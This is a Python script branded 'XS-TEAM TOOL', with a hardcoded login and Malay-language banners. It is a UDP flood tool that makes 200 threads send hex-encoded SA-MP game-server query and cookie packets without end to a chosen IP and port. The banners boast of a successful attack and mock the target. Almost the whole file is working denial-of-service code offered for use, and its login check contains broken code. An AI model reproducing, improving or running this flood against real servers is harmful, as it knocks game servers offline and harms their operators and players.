##===##===##===##===##===##===##==
##===##==={ XS-TEAM TOOL }===##===
##===##===##===##===##===##===##==
import socket
import struct
import codecs,sys
import threading
import random
import time
import os

##===##=== LOGIN
x = 'XD-TOOLS'
y = 'XD-GANTENG'

def login():
    os.system('clear')
    user = raw_input('Username : ')
    pasw = raw_input('Password : ')
    if user == x and pasw == y:
         print('Login Sucessfully Acoount [XD-TEAM]')
	 time.sleep(3)
	 sys.exit
    else:
	 print('Password Salah')
	 login()
	
if _nama_ == '_main_':
      login()

##===##=== STARTED
ip = str(input("IP/HOST: "))
port = int(input("PORT: "))
orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]

os.system("clear")
print ("""\033[31m
                                           ╔═════════════════════════════════╗
                                           ║     Sucessfully To Attack!      ║ 
                                           ╚═════════════════════════════════╝
""")
print('\033[31m                                           ╔═════════════════════════════════╗')
print('\033[31m                                           ║    Packets XDempteRX Otw     ║')
print('\033[31m                                           ╚═════════════════════════════════╝')
print("\033[31m                    ADE BARANG OTW SAMPAI TU IP: %s ALAMAT PORT: %s"%(orgip,port))

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('____________________________')
         print('                            ')
         print('BARANG XDEMPTERX SUDA SAMPAI')
         print('____________________________')
         print('\n\n')
         print('TENGOK JAK APA JADI IP {} WKWKWK'.format(orgip))
         pass
